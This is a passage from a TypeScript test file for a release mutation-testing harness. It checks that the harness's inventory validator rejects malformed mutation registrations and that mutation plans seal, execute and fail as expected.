      '\n    void replaceExactly("inventory", "inventory", "mutant");',
      oracleSource.slice(matrixBodyOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(extraProjectMutation)).toContain(
      "release mutation hybrid inventory expected 538 first / 22 all, found 539 first / 22 all (legacy 539/22; declarative 0/0; cases 0)"
    );
    const outsideMutation = `${oracleSource}\nvoid replaceAllExactly("inventory", "inventory", "mutant");\n`;
    expect(releaseMutationInventoryProblems(outsideMutation)).toContain(
      "release mutation helpers outside the reviewed matrix/self-control callback: 1"
    );
    const firstProjectCallOffset = oracleSource.indexOf("replaceExactly(", matrixBodyOffset);
    expect(firstProjectCallOffset).toBeGreaterThan(matrixBodyOffset);
    const projectModeDrift = [
      oracleSource.slice(0, firstProjectCallOffset),
      "replaceAllExactly(",
      oracleSource.slice(firstProjectCallOffset + "replaceExactly(".length)
    ].join("");
    expect(releaseMutationInventoryProblems(projectModeDrift)).toContain(
      "release mutation hybrid inventory expected 538 first / 22 all, found 537 first / 23 all (legacy 537/23; declarative 0/0; cases 0)"
    );
    const hybridLegacyRemoval = [
      oracleSource.slice(0, firstProjectCallOffset),
      "legacyMigratedExactly(",
      oracleSource.slice(firstProjectCallOffset + "replaceExactly(".length)
    ].join("");
    const hybridDeclarativePrelude = `
    const releaseMutationPlan = new ReleaseMutationPlan({ total: 1, first: 1, all: 0 });
    const hybridSourceHandle = releaseMutationPlan.registerSource("fixture.hybrid", "inventory");
    const hybridMutationHandle = releaseMutationPlan.registerMutation("mutation.hybrid", {
      mode: "first",
      source: hybridSourceHandle,
      needle: "inventory",
      replacement: "mutant",
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "inventory", before: 1, after: 0 }
    });
    releaseMutationPlan.registerCase({
      id: "case.hybrid",
      root: hybridMutationHandle,
      invoke: { kind: "fixture.text", baseline: hybridSourceHandle, mutant: hybridMutationHandle },
      expectations: [{ id: "expectation.hybrid", kind: "equal", value: "mutant" }]
    });
    const releaseMutationProblems = releaseMutationPlan.seal();
    expect(releaseMutationProblems).toEqual([]);
    releaseMutationPlan.execute();`;
    const hybridDeclarativeMutation = [
      hybridLegacyRemoval.slice(0, matrixBodyOffset),
      hybridDeclarativePrelude,
      hybridLegacyRemoval.slice(matrixBodyOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(hybridDeclarativeMutation)).toEqual([]);
    const hybridPreludeEnd = matrixBodyOffset + hybridDeclarativePrelude.length;
    const hybridPreludeOffset = (token: string): number => {
      const fixture = hybridDeclarativeMutation.slice(matrixBodyOffset, hybridPreludeEnd);
      expect(mutationMatchCount(fixture, token)).toBe(1);
      const relativeOffset = fixture.indexOf(token);
      expect(relativeOffset).toBeGreaterThanOrEqual(0);
      return matrixBodyOffset + relativeOffset;
    };
    const boundHandlePrefix = "const hybridMutationHandle = ";
    expect(hybridDeclarativeMutation.indexOf(boundHandlePrefix)).toBeLessThan(matrixBodyOffset);
    const boundHandleOffset = hybridPreludeOffset(boundHandlePrefix);
    expect(boundHandleOffset).toBeGreaterThanOrEqual(matrixBodyOffset);
    const discardedDeclarativeHandle = [
      hybridDeclarativeMutation.slice(0, boundHandleOffset),
      "void ",
      hybridDeclarativeMutation.slice(boundHandleOffset + boundHandlePrefix.length)
    ].join("");
    expect(releaseMutationInventoryProblems(discardedDeclarativeHandle)).toContainEqual(
      expect.stringMatching(/registerMutation requires one top-level const handle/)
    );
    const sourceValueToken = 'registerSource("fixture.hybrid", "inventory")';
    const sourceValueOffset = hybridPreludeOffset(sourceValueToken);
    const evaluatedDeclarativeSource = [
      hybridDeclarativeMutation.slice(0, sourceValueOffset),
      'registerSource("fixture.hybrid", String("inventory"))',
      hybridDeclarativeMutation.slice(sourceValueOffset + sourceValueToken.length)
    ].join("");
    expect(releaseMutationInventoryProblems(evaluatedDeclarativeSource)).toContainEqual(
      expect.stringMatching(/passive identifier\/string source value/)
    );
    const descriptorModeToken = 'mode: "first",\n      source: hybridSourceHandle';
    const descriptorModeOffset = hybridPreludeOffset(descriptorModeToken);
    const spreadDeclarativeDescriptor = [
      hybridDeclarativeMutation.slice(0, descriptorModeOffset),
      '...dynamicDescriptor,\n      mode: "first",\n      source: hybridSourceHandle',
      hybridDeclarativeMutation.slice(descriptorModeOffset + descriptorModeToken.length)
    ].join("");
    expect(releaseMutationInventoryProblems(spreadDeclarativeDescriptor)).toContainEqual(
      expect.stringMatching(/descriptor requires exact passive/)
    );
    const caseRootToken = "root: hybridMutationHandle";
    const caseRootOffset = hybridPreludeOffset(caseRootToken);
    const sourceRootDeclarativeCase = [
      hybridDeclarativeMutation.slice(0, caseRootOffset),
      "root: hybridSourceHandle",
      hybridDeclarativeMutation.slice(caseRootOffset + caseRootToken.length)
    ].join("");
    expect(releaseMutationInventoryProblems(sourceRootDeclarativeCase)).toContainEqual(
      expect.stringMatching(/source handle cannot be a case root/)
    );
    const expectationToken = 'expectations: [{ id: "expectation.hybrid", kind: "equal", value: "mutant" }]';
    const expectationOffset = hybridPreludeOffset(expectationToken);
    const emptyDeclarativeExpectations = [
      hybridDeclarativeMutation.slice(0, expectationOffset),
      "expectations: []",
      hybridDeclarativeMutation.slice(expectationOffset + expectationToken.length)
    ].join("");
    expect(releaseMutationInventoryProblems(emptyDeclarativeExpectations)).toContainEqual(
      expect.stringMatching(/requires one non-empty literal expectations array/)
    );
    const invocationKindToken = 'invoke: { kind: "fixture.text"';
    const invocationKindOffset = hybridPreludeOffset(invocationKindToken);
    const unknownDeclarativeInvocation = [
      hybridDeclarativeMutation.slice(0, invocationKindOffset),
      'invoke: { kind: "fixture.dynamic"',
      hybridDeclarativeMutation.slice(invocationKindOffset + invocationKindToken.length)
    ].join("");
    expect(releaseMutationInventoryProblems(unknownDeclarativeInvocation)).toContainEqual(
      expect.stringMatching(/case invocation kind must be one closed literal/)
    );
    const unknownNamedRegexExpectation = [
      hybridDeclarativeMutation.slice(0, expectationOffset),
      'expectations: [{ id: "expectation.hybrid", kind: "regex", regex: "fixture.dynamic" }]',
      hybridDeclarativeMutation.slice(expectationOffset + expectationToken.length)
    ].join("");
    expect(releaseMutationInventoryProblems(unknownNamedRegexExpectation)).toContainEqual(
      expect.stringMatching(/requires one named regex identity/)
    );
    const duplicateSemanticExpectations = [
      hybridDeclarativeMutation.slice(0, expectationOffset),
      [
        "expectations: [",
        '  { id: "expectation.hybrid", kind: "equal", value: "mutant" },',
        '  { id: "expectation.hybrid-padding", kind: "equal", value: "mutant" }',
        "]"
      ].join("\n      "),
      hybridDeclarativeMutation.slice(expectationOffset + expectationToken.length)
    ].join("");
    expect(releaseMutationInventoryProblems(duplicateSemanticExpectations)).toContainEqual(
      expect.stringMatching(/duplicates one case semantic check/)
    );
    const sealSequence = [
      "const releaseMutationProblems = releaseMutationPlan.seal();",
      "expect(releaseMutationProblems).toEqual([]);",
      "releaseMutationPlan.execute();"
    ].join("\n    ");
    const sealSequenceOffset = hybridPreludeOffset(sealSequence);
    const missingDeclarativeExecution = [
      hybridDeclarativeMutation.slice(0, sealSequenceOffset),
      hybridDeclarativeMutation.slice(sealSequenceOffset + sealSequence.length)
    ].join("");
    expect(releaseMutationInventoryProblems(missingDeclarativeExecution)).toContain(
      "release mutation declarative plan requires one top-level const releaseMutationProblems = releaseMutationPlan.seal(), immediate expect(...).toEqual([]), then one direct releaseMutationPlan.execute() after all registrations"
    );
    const sourceOnlyDeclarativeMutation = [
      oracleSource.slice(0, matrixBodyOffset),
      [
        "",
        "    const releaseMutationPlan = new ReleaseMutationPlan({ total: 0, first: 0, all: 0 });",
        '    const sourceOnlyHandle = releaseMutationPlan.registerSource("fixture.source-only", "inventory");',
        "    void sourceOnlyHandle;"
      ].join("\n"),
      oracleSource.slice(matrixBodyOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(sourceOnlyDeclarativeMutation)).toContain(
      "release mutation declarative plan requires one top-level const releaseMutationProblems = releaseMutationPlan.seal(), immediate expect(...).toEqual([]), then one direct releaseMutationPlan.execute() after all registrations"
    );
    const legacyFreeMatrix = [
      oracleSource.slice(0, matrixBodyOffset),
      oracleSource
        .slice(matrixBodyOffset)
        .split("replaceAllExactly(")
        .join("legacyMigratedAllExactly(")
        .split("replaceExactly(")
        .join("legacyMigratedExactly(")
    ].join("");
    expect(releaseMutationInventoryProblems(legacyFreeMatrix)).toContain(
      "release mutation final closed graph expected 560 unique descriptors / 536 cases and roots / 541 expectations / 24 dependency-only, found 0 descriptors / 0 cases / 0 roots / 0 expectations / 0 dependency-only"
    );
    const loopGeneratedDeclarative = [
      oracleSource.slice(0, matrixBodyOffset),
      '\n    for (const id of ["mutation.generated"]) { releaseMutationPlan.registerMutation(id, { mode: "first" }); }',
      oracleSource.slice(matrixBodyOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(loopGeneratedDeclarative)).toContainEqual(
      expect.stringMatching(
        /registerMutation must be one explicit straight-line registration, not nested under ForOfStatement/
      )
    );
    const aliasedDeclarative = [
      oracleSource.slice(0, matrixBodyOffset),
      "\n    const addMutation = releaseMutationPlan.registerMutation; void addMutation;",
      oracleSource.slice(matrixBodyOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(aliasedDeclarative)).toContainEqual(
      expect.stringMatching(/registerMutation must be one direct property call on releaseMutationPlan/)
    );
    const computedDeclarative = [
      oracleSource.slice(0, matrixBodyOffset),
      '\n    releaseMutationPlan["registerMutation"]("mutation.computed", { mode: "first" });',
      oracleSource.slice(matrixBodyOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(computedDeclarative)).toContainEqual(
      expect.stringMatching(/registerMutation must be one direct property call on releaseMutationPlan/)
    );
    const templateIdDeclarative = [
      oracleSource.slice(0, matrixBodyOffset),
      '\n    releaseMutationPlan.registerMutation(`mutation.template`, { mode: "first" });',
      oracleSource.slice(matrixBodyOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(templateIdDeclarative)).toContainEqual(
      expect.stringMatching(/registerMutation requires one literal id and one object descriptor/)
    );
    const conditionalDeclarativeCase = [
      oracleSource.slice(0, matrixBodyOffset),
      '\n    false && releaseMutationPlan.registerCase({ id: "case.conditional" });',
      oracleSource.slice(matrixBodyOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(conditionalDeclarativeCase)).toContainEqual(
      expect.stringMatching(
        /registerCase must be one explicit straight-line registration, not nested under BinaryExpression/
      )
    );
    const loopGeneratedMutation = [
      oracleSource.slice(0, matrixBodyOffset),
      '\n    for (const value of ["inventory", "inventory"]) { void replaceExactly(value, "inventory", "mutant"); }',
      oracleSource.slice(matrixBodyOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(loopGeneratedMutation)).toContainEqual(
      expect.stringMatching(/replaceExactly must be one explicit straight-line case, not nested under ForOfStatement/)
    );
    const loopBindingMutation = [
      oracleSource.slice(0, matrixBodyOffset),
      '\n    for (const [value = replaceExactly("inventory", "inventory", "mutant")] of [[]]) { void value; }',
      oracleSource.slice(matrixBodyOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(loopBindingMutation)).toContainEqual(
      expect.stringMatching(/replaceExactly must be one explicit straight-line case, not nested under BindingElement/)
    );
    const mappedMutation = [
      oracleSource.slice(0, matrixBodyOffset),
      '\n    ["inventory"].map((value) => replaceExactly(value, "inventory", "mutant"));',
      oracleSource.slice(matrixBodyOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(mappedMutation)).toContainEqual(
      expect.stringMatching(/replaceExactly must be one explicit straight-line case, not nested under ArrowFunction/)
    );
    const optionalMutation = [
      oracleSource.slice(0, matrixBodyOffset),
      '\n    ({ run: (_value: string) => undefined }).run?.(replaceExactly("inventory", "inventory", "mutant"));',
      oracleSource.slice(matrixBodyOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(optionalMutation)).toContainEqual(
      expect.stringMatching(/replaceExactly must be one explicit straight-line case, not nested under CallExpression/)
    );
    const logicalAssignmentMutation = [
      oracleSource.slice(0, matrixBodyOffset),
      '\n    let enabled = true; enabled &&= replaceExactly("inventory", "inventory", "mutant") === "mutant";',
      oracleSource.slice(matrixBodyOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(logicalAssignmentMutation)).toContainEqual(
      expect.stringMatching(/replaceExactly must be one explicit straight-line case, not nested under BinaryExpression/)
    );
    const destructuringDefaultMutation = [
      oracleSource.slice(0, matrixBodyOffset),
      '\n    const [value = replaceExactly("inventory", "inventory", "mutant")] = []; void value;',
      oracleSource.slice(matrixBodyOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(destructuringDefaultMutation)).toContainEqual(
      expect.stringMatching(/replaceExactly must be one explicit straight-line case, not nested under BindingElement/)
    );
    const classInitializerMutation = [
      oracleSource.slice(0, matrixBodyOffset),
      '\n    class RepeatedMutation { value = replaceExactly("inventory", "inventory", "mutant"); } void new RepeatedMutation(); void new RepeatedMutation();',
      oracleSource.slice(matrixBodyOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(classInitializerMutation)).toContainEqual(
      expect.stringMatching(/replaceExactly must be one explicit straight-line case, not nested under ClassDeclaration/)
    );
    const iterableLiteralMutation = [
      oracleSource.slice(0, matrixBodyOffset),
      '\n    for (const value of [replaceExactly("inventory", "inventory", "mutant")]) { void value; }',
      oracleSource.slice(matrixBodyOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(iterableLiteralMutation)).not.toContainEqual(
      expect.stringMatching(/must be one explicit straight-line case/)
    );
    expect(releaseMutationInventoryProblems(iterableLiteralMutation)).toContain(
      "release mutation hybrid inventory expected 538 first / 22 all, found 539 first / 22 all (legacy 539/22; declarative 0/0; cases 0)"
    );
    const nestedStraightLineMutation = [
      oracleSource.slice(0, matrixBodyOffset),
      '\n    void replaceExactly(replaceExactly("inventory", "inventory", "mutant"), "mutant", "final");',
      oracleSource.slice(matrixBodyOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(nestedStraightLineMutation)).not.toContainEqual(
      expect.stringMatching(/must be one explicit straight-line case/)
    );
    expect(releaseMutationInventoryProblems(nestedStraightLineMutation)).toContain(
      "release mutation hybrid inventory expected 538 first / 22 all, found 540 first / 22 all (legacy 540/22; declarative 0/0; cases 0)"
    );
    const earlyReturnMutation = [
      oracleSource.slice(0, matrixBodyOffset),
      "\n    return;",
      oracleSource.slice(matrixBodyOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(earlyReturnMutation)).toContainEqual(
      expect.stringMatching(/matrix callback must not return before all explicit cases execute/)
    );
    const earlyReturnBeforeMatrix = [
      oracleSource.slice(0, matrixStartOffset),
      "    return;\n",
      oracleSource.slice(matrixStartOffset)
    ].join("");
    expect(releaseMutationInventoryProblems(earlyReturnBeforeMatrix)).toContainEqual(
      expect.stringMatching(/matrix callback must not return before all explicit cases execute/)
    );
    const aliasedMutationHelper = `${oracleSource}\nconst mutationAlias = replaceExactly;\n`;
    expect(releaseMutationInventoryProblems(aliasedMutationHelper)).toEqual([
      expect.stringMatching(/replaceExactly must be a direct call to its sole top-level definition/)
    ]);
    const parenthesizedMutationHelper = `${oracleSource}\nvoid (replaceExactly)("a", "a", "b");\n`;
    expect(releaseMutationInventoryProblems(parenthesizedMutationHelper)).toEqual([
      expect.stringMatching(/replaceExactly must be a direct call to its sole top-level definition/)
    ]);
    const shadowedMutationHelper = `${oracleSource}\nfunction replaceExactly(): string { return "shadow"; }\n`;
    expect(releaseMutationInventoryProblems(shadowedMutationHelper)).toContain(
      "release mutation helper definitions expected 1 first / 1 all, found 2 first / 1 all"
    );

    type FixtureMutationInput = Parameters<ReleaseMutationPlan["registerMutation"]>[1];
    const registerFixtureMutation = (plan: ReleaseMutationPlan, id: string, registration: FixtureMutationInput) =>
      plan.registerMutation(id, registration);

    const emptyPlan = new ReleaseMutationPlan();
    expect(emptyPlan.seal()).toEqual([
      "[inventory.empty] plan: plan must register at least one mutation",
      "[source.none] plan: plan must register at least one canonical source",
      "[case.none] plan: plan must register at least one closed case"
    ]);
    expect(emptyPlan.phase).toBe("rejected");
    expect(emptyPlan.caseExecutions).toBe(0);
    expect(() => emptyPlan.execute()).toThrow(/requires sealed state; found rejected/);
    expect(() => emptyPlan.registerSource("fixture.late", "late")).toThrow(/entered rejected state/);

    const cleanPlan = new ReleaseMutationPlan({ total: 7, first: 5, all: 2 });
    const cleanSource = cleanPlan.registerSource("fixture.clean", "alpha alpha\nbeta\n");
    const replacementSource = cleanPlan.registerSource("fixture.replacement", "seed");
    const replacementTarget = cleanPlan.registerSource("fixture.replacement-target", "slot");
    const literalSource = cleanPlan.registerSource("fixture.literal", "alpha");
    const allLiteralSource = cleanPlan.registerSource("fixture.literal-all", "a-a");
    const throwSource = cleanPlan.registerSource("fixture.throw", "alpha");
    expect(Object.isFrozen(cleanSource)).toBe(true);
    expect(Reflect.ownKeys(cleanSource)).toEqual([]);

    const cleanFirst = registerFixtureMutation(cleanPlan, "mutation.clean-first", {
      mode: "first",
      source: cleanSource,
      needle: "alpha",
      replacement: "omega",
      expectedOccurrences: 2,
      witness: { kind: "token", anchor: "alpha", before: 2, after: 1 }
    });
    const cleanAll = registerFixtureMutation(cleanPlan, "mutation.clean-all", {
      mode: "all",
      source: cleanFirst,
      needle: "alpha",
      replacement: "delta",
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "alpha", before: 1, after: 0 }
    });
    const replacementValue = registerFixtureMutation(cleanPlan, "mutation.replacement-value", {
      mode: "first",
      source: replacementSource,
      needle: "seed",
      replacement: "omega",
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "seed", before: 1, after: 0 }
    });
    const replacementRoot = registerFixtureMutation(cleanPlan, "mutation.replacement-root", {
      mode: "first",
      source: replacementTarget,
      needle: "slot",
      replacement: replacementValue,
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "slot", before: 1, after: 0 }
    });
    const literalRoot = registerFixtureMutation(cleanPlan, "mutation.literal-first", {
      mode: "first",
      source: literalSource,
      needle: "alpha",
      replacement: "$&|$$|$1",
      expectedOccurrences: 1,
      witness: { kind: "line", anchor: "alpha|$|$1", before: 0, after: 1 }
    });
    const allLiteralRoot = registerFixtureMutation(cleanPlan, "mutation.literal-all", {
      mode: "all",
      source: allLiteralSource,
      needle: "a",
      replacement: "$$",
      expectedOccurrences: 2,
      witness: { kind: "line", anchor: "$-$", before: 0, after: 1 }
    });
    const throwRoot = registerFixtureMutation(cleanPlan, "mutation.throw", {
      mode: "first",
      source: throwSource,
      needle: "alpha",
      replacement: "omega",
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "alpha", before: 1, after: 0 }
    });

    cleanPlan.registerCase({
      id: "case.clean-first",
      root: cleanFirst,
      invoke: { kind: "fixture.text", baseline: cleanSource, mutant: cleanFirst },
      expectations: [
        { id: "expectation.clean-first-equal", kind: "equal", value: "omega alpha\nbeta\n" },
        { id: "expectation.clean-first-not-equal", kind: "not-equal", value: "alpha alpha\nbeta\n" },
        { id: "expectation.clean-first-regex", kind: "regex", regex: "fixture.omega-token" }
      ]
    });
    cleanPlan.registerCase({
      id: "case.clean-all",
      root: cleanAll,
      invoke: { kind: "fixture.text", baseline: cleanFirst, mutant: cleanAll },
      expectations: [{ id: "expectation.clean-all", kind: "equal", value: "omega delta\nbeta\n" }]
    });
    cleanPlan.registerCase({
      id: "case.replacement-root",
      root: replacementRoot,
      invoke: { kind: "fixture.text", baseline: replacementTarget, mutant: replacementRoot },
      expectations: [{ id: "expectation.replacement-root", kind: "equal", value: "omega" }]
    });
    cleanPlan.registerCase({
      id: "case.literal-first",
      root: literalRoot,
      invoke: { kind: "fixture.text", baseline: literalSource, mutant: literalRoot },
      expectations: [{ id: "expectation.literal-first", kind: "equal", value: "alpha|$|$1" }]
    });
    cleanPlan.registerCase({
      id: "case.literal-all",
      root: allLiteralRoot,
      invoke: { kind: "fixture.text", baseline: allLiteralSource, mutant: allLiteralRoot },
      expectations: [{ id: "expectation.literal-all", kind: "equal", value: "$-$" }]
    });
    cleanPlan.registerCase({
      id: "case.throw",
      root: throwRoot,
      invoke: {
        kind: "fixture.throw",
        baseline: throwSource,
        mutant: throwRoot,
        message: "synthetic omega rejection"
      },
      expectations: [
        {
          id: "expectation.throw-problem",
          kind: "problem",
          problem: "fixture.mutant-threw"
        }
      ]
    });
    expect(cleanPlan.caseExecutions).toBe(0);
    expect(cleanPlan.seal()).toEqual([]);
    expect(cleanPlan.phase).toBe("sealed");
    expect(cleanPlan.diagnostics).toEqual([]);
    expect(() => cleanPlan.registerSource("fixture.after-seal", "late")).toThrow(/entered sealed state/);
    cleanPlan.execute();
    expect(cleanPlan.phase).toBe("executed");
    expect(cleanPlan.caseExecutions).toBe(6);
    expect(() => cleanPlan.execute()).toThrow(/requires sealed state; found executed/);

    const failurePlan = new ReleaseMutationPlan({ total: 2, first: 2, all: 0 });
    const failureSource = failurePlan.registerSource("fixture.failure", "alpha beta");
    const failureFirst = registerFixtureMutation(failurePlan, "mutation.failure-first", {
      mode: "first",
      source: failureSource,
      needle: "alpha",
      replacement: "omega",
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "alpha", before: 1, after: 0 }
    });
    const failureLater = registerFixtureMutation(failurePlan, "mutation.failure-later", {
      mode: "first",
      source: failureSource,
      needle: "beta",
      replacement: "delta",
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "beta", before: 1, after: 0 }
    });
    failurePlan.registerCase({
      id: "case.failure-first",
      root: failureFirst,
      invoke: { kind: "fixture.text", baseline: failureSource, mutant: failureFirst },
      expectations: [{ id: "expectation.failure-first", kind: "equal", value: "wrong" }]
    });
    failurePlan.registerCase({
      id: "case.failure-later",
      root: failureLater,
      invoke: { kind: "fixture.text", baseline: failureSource, mutant: failureLater },
      expectations: [{ id: "expectation.failure-later", kind: "equal", value: "alpha delta" }]
    });
    expect(failurePlan.seal()).toEqual([]);
    expect(() => failurePlan.execute()).toThrow(/case case.failure-first expectation expectation.failure-first failed/);
    expect(failurePlan.phase).toBe("failed");
    expect(failurePlan.caseExecutions).toBe(1);

    const missingProblemPlan = new ReleaseMutationPlan({ total: 1, first: 1, all: 0 });
    const missingProblemSource = missingProblemPlan.registerSource("fixture.missing-problem", "alpha");
    const missingProblemRoot = registerFixtureMutation(missingProblemPlan, "mutation.missing-problem", {
      mode: "first",
      source: missingProblemSource,
      needle: "alpha",
      replacement: "beta",
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "alpha", before: 1, after: 0 }
    });
    missingProblemPlan.registerCase({
      id: "case.missing-problem",
      root: missingProblemRoot,
      invoke: {
        kind: "fixture.throw",
        baseline: missingProblemSource,
        mutant: missingProblemRoot,
        message: "synthetic missing problem"
      },
      expectations: [
        {
          id: "expectation.missing-problem",
          kind: "problem",
          problem: "fixture.mutant-threw"
        }
      ]
    });
    expect(missingProblemPlan.seal()).toEqual([]);
    expect(() => missingProblemPlan.execute()).toThrow(/missed an exact problem/);
    expect(missingProblemPlan.phase).toBe("failed");
    expect(missingProblemPlan.caseExecutions).toBe(1);

    const foreignPlan = new ReleaseMutationPlan();
    const foreignSource = foreignPlan.registerSource("fixture.foreign", "alpha");
    const invalidPlan = new ReleaseMutationPlan({ total: 2, first: 1, all: 1 });
    const invalidEmptySource = invalidPlan.registerSource("fixture.empty", "");
    const invalidIdSource = invalidPlan.registerSource("fixture..invalid", "alpha");
    const duplicateSource = invalidPlan.registerSource("fixture.duplicate", "alpha");
    invalidPlan.registerSource("fixture.duplicate", "beta");
    const invalidMode = invalidPlan.registerMutation("mutation.invalid-mode", {
      mode: "sideways",
      source: duplicateSource,
      needle: "alpha",
      replacement: "omega",
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "alpha", before: 1, after: 0 }
    } as never);
    registerFixtureMutation(invalidPlan, "mutation.foreign-source", {
      mode: "first",
      source: foreignSource,
      needle: "alpha",
      replacement: "omega",
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "alpha", before: 1, after: 0 }
    });
    registerFixtureMutation(invalidPlan, "mutation.missing-cardinality", {
      mode: "first",
      source: duplicateSource,
      needle: "missing",
      replacement: "omega",
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "missing", before: 1, after: 0 }
    });
    registerFixtureMutation(invalidPlan, "mutation.noop", {
      mode: "first",
      source: duplicateSource,
      needle: "alpha",
      replacement: "alpha",
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "alpha", before: 1, after: 0 }
    });
    invalidPlan.registerCase({
      id: "case.invalid-mode",
      root: invalidMode,
      invoke: { kind: "fixture.text", baseline: duplicateSource, mutant: invalidMode },
      expectations: [{ id: "expectation.invalid-mode", kind: "equal", value: "omega" }]
    });
    invalidPlan.registerCase({
      id: "case.source-root",
      root: invalidEmptySource,
      invoke: { kind: "fixture.text", baseline: invalidIdSource, mutant: invalidEmptySource },
      expectations: [{ id: "expectation.source-root", kind: "equal", value: "omega" }]
    } as never);
    invalidPlan.registerCase({
      id: "case.forged-root",
      root: {},
      invoke: { kind: "fixture.text", baseline: duplicateSource, mutant: {} },
      expectations: [{ id: "expectation.forged-root", kind: "equal", value: "omega" }]
    } as never);
    const invalidDiagnostics = invalidPlan.seal();
    expect(invalidDiagnostics).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/^\[inventory.mismatch\]/),
        expect.stringMatching(/^\[source.empty\]/),
        expect.stringMatching(/^\[source.id\]/),
        expect.stringMatching(/^\[source.duplicate\]/),
        expect.stringMatching(/^\[mutation.mode\]/),
        expect.stringMatching(/^\[dependency.handle\]/),
        expect.stringMatching(/^\[mutation.cardinality\]/),
        expect.stringMatching(/^\[mutation.noop\]/),
        expect.stringMatching(/^\[case.root\]/),
        expect.stringMatching(/^\[mutation.orphan\]/)
      ])
    );
    expect(invalidPlan.phase).toBe("rejected");
    expect(invalidPlan.caseExecutions).toBe(0);
    expect(() => invalidPlan.execute()).toThrow(/requires sealed state; found rejected/);

    const baselinePlan = new ReleaseMutationPlan({ total: 2, first: 2, all: 0 });
    const baselineReplacementSource = baselinePlan.registerSource("fixture.baseline-replacement", "seed");
    const baselineTarget = baselinePlan.registerSource("fixture.baseline-target", "slot");
    const baselineReplacement = registerFixtureMutation(baselinePlan, "mutation.baseline-replacement", {
      mode: "first",
      source: baselineReplacementSource,
      needle: "seed",
      replacement: "omega",
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "seed", before: 1, after: 0 }
    });
    const baselineRoot = registerFixtureMutation(baselinePlan, "mutation.baseline-root", {
      mode: "first",
      source: baselineTarget,
      needle: "slot",
      replacement: baselineReplacement,
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "slot", before: 1, after: 0 }
    });
    baselinePlan.registerCase({
      id: "case.baseline-replacement",
      root: baselineRoot,
      invoke: { kind: "fixture.text", baseline: baselineReplacement, mutant: baselineRoot },
      expectations: [{ id: "expectation.baseline-replacement", kind: "equal", value: "omega" }]
    });
    expect(baselinePlan.seal()).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/^\[case.baseline\].*source lineage/),
        expect.stringMatching(/^\[mutation.orphan\]/)
      ])
    );

    const equalOutputPlan = new ReleaseMutationPlan({ total: 2, first: 2, all: 0 });
    const equalOutputSource = equalOutputPlan.registerSource("fixture.equal-output", "alpha");
    const equalOutputParent = registerFixtureMutation(equalOutputPlan, "mutation.equal-output-parent", {
      mode: "first",
      source: equalOutputSource,
      needle: "alpha",
      replacement: "omega",
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "alpha", before: 1, after: 0 }
    });
    const equalOutputRoot = registerFixtureMutation(equalOutputPlan, "mutation.equal-output-root", {
      mode: "first",
      source: equalOutputParent,
      needle: "omega",
      replacement: "alpha",
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "omega", before: 1, after: 0 }
    });
    equalOutputPlan.registerCase({
      id: "case.equal-output",
      root: equalOutputRoot,
      invoke: { kind: "fixture.text", baseline: equalOutputSource, mutant: equalOutputRoot },
      expectations: [{ id: "expectation.equal-output", kind: "equal", value: "alpha" }]
    });
    expect(equalOutputPlan.seal()).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/^\[case.baseline\].*materializes to the mutant root output/),
        expect.stringMatching(/^\[mutation.orphan\]/)
      ])
    );

    const caseValidationPlan = new ReleaseMutationPlan({ total: 2, first: 2, all: 0 });
    const caseValidationSource = caseValidationPlan.registerSource("fixture.case-validation", "alpha beta");
    const duplicateSemanticRoot = registerFixtureMutation(caseValidationPlan, "mutation.duplicate-semantic", {
      mode: "first",
      source: caseValidationSource,
      needle: "alpha",
      replacement: "omega",
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "alpha", before: 1, after: 0 }
    });
    const incompatibleRoot = registerFixtureMutation(caseValidationPlan, "mutation.incompatible", {
      mode: "first",
      source: caseValidationSource,
      needle: "beta",
      replacement: "omega",
      expectedOccurrences: 1,
      witness: { kind: "token", anchor: "beta", before: 1, after: 0 }
    });
    caseValidationPlan.registerCase({
      id: "case.duplicate-semantic",
      root: duplicateSemanticRoot,
      invoke: { kind: "fixture.text", baseline: caseValidationSource, mutant: duplicateSemanticRoot },
      expectations: [
        { id: "expectation.duplicate-semantic-a", kind: "equal", value: "omega beta" },
        { id: "expectation.duplicate-semantic-b", kind: "equal", value: "omega beta" }
      ]
    });
    caseValidationPlan.registerCase({
      id: "case.duplicate-root",
      root: duplicateSemanticRoot,
      invoke: { kind: "fixture.text", baseline: caseValidationSource, mutant: duplicateSemanticRoot },
      expectations: [{ id: "expectation.duplicate-root", kind: "not-equal", value: "alpha beta" }]
    });
    caseValidationPlan.registerCase({
      id: "case.incompatible",
      root: incompatibleRoot,
      invoke: {
        kind: "fixture.throw",
        baseline: caseValidationSource,
        mutant: incompatibleRoot,
        message: "synthetic incompatible expectation"
      },
      expectations: [{ id: "expectation.incompatible", kind: "equal", value: "alpha omega" }]
